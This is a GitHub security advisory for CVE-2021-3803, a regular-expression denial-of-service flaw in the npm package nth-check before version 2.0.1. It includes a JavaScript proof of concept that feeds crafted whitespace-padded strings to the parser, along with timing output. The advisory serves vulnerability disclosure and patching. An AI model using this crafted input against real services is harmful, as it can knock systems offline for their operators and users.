# [H] Inefficient Regular Expression Complexity in nth-check

## Summary
Severity: High
Advisory: GHSA-rp65-9cf3-cjxr
CVE: CVE-2021-3803
CWE: CWE-1333
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2021-09-20
Source: https://github.com/advisories/GHSA-rp65-9cf3-cjxr
Type: github-advisory

## Affected
- npm: `nth-check` — affected >=0 <2.0.1

## Details
There is a Regular Expression Denial of Service (ReDoS) vulnerability in nth-check that causes a denial of service when parsing crafted invalid CSS nth-checks.

The ReDoS vulnerabilities of the regex are mainly due to the sub-pattern `\s*(?:([+-]?)\s*(\d+))?` with quantified overlapping adjacency and can be exploited with the following code.

**Proof of Concept**
```js
// PoC.js
var nthCheck = require("nth-check")
for(var i = 1; i <= 50000; i++) {
    var time = Date.now();
    var attack_str = '2n' + ' '.repeat(i*10000)+"!";
    try {
        nthCheck.parse(attack_str) 
    }
    catch(err) {
        var time_cost = Date.now() - time;
        console.log("attack_str.length: " + attack_str.length + ": " + time_cost+" ms")
    }
}
```

**The Output**
```
attack_str.length: 10003: 174 ms
attack_str.length: 20003: 1427 ms
attack_str.length: 30003: 2602 ms
attack_str.length: 40003: 4378 ms
attack_str.length: 50003: 7473 ms
```

## References
- https://nvd.nist.gov/vuln/detail/CVE-2021-3803
- https://github.com/fb55/nth-check/commit/9894c1d2010870c351f66c6f6efcf656e26bb726
- https://github.com/fb55/nth-check
- https://huntr.dev/bounties/8cf8cc06-d2cf-4b4e-b42c-99fafb0b04d0
- https://lists.debian.org/debian-lts-announce/2023/05/msg00023.html
